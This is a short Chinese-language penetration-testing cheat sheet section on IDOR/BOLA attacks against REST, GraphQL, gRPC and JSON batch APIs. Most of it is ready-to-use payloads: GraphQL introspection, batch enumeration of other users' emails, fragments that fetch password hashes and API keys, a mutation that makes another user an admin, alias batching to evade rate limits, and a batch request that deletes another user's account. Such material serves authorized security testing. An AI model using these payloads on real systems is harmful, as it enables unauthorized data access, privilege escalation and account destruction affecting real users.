## 四、API特定IDOR

### 4.1 REST API测试
```
GET/PUT/DELETE/PATCH /api/users/{id}  每个端点替换{id}测试
GET /api/users/{id}/orders
POST /api/users/{id}/transfer
# 注意关系子资源：/orders/{id}/payments /teams/{id}/members
```

### 4.2 GraphQL IDOR/BOLA（高级）
```graphql
# Introspection
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# 批量查询其他用户
query { user(id:1){email} user(id:2){email} user(id:3){email} }

# 节点接口（Node interface）批量
{
  node(id: "VXNlcjox") { ... on User { email } }
  node(id: "VXNlcjoy") { ... on User { email } }
}
# base64解码确认ID格式 → 枚举

# 字段级权限绕过（fragment/指令）
fragment F on User { passwordHash, role, apiKey }
query { user(id:1) { ...F } }
query { user(id:1) { email @skip(if:false) role @include(if:true) } }

# 未做对象级授权
mutation { updateUser(id:2, role:"admin") { id role } }

# 别名批量绕过速率限制
query { a:user(id:1){email} b:user(id:2){email} ... }

# 嵌套关联对象越权（关系链GraphQL版）
query { order(id:1001) { user { email } } }   # 他人订单→用户邮箱
```

### 4.3 gRPC/Protobuf IDOR
- 反编译.proto，查看服务定义
- 修改请求中的ID字段
- 反射服务测试：`grpcurl -plaintext target:443 list`
- Metadata中用户身份字段可篡改（authorization/tenant）
- 注意gRPC网关REST双入口鉴权差异

### 4.4 JSON API批量操作
```json
POST /api/batch
{"operations":[{"method":"GET","path":"/users/1"},{"method":"DELETE","path":"/users/3"}]}
```

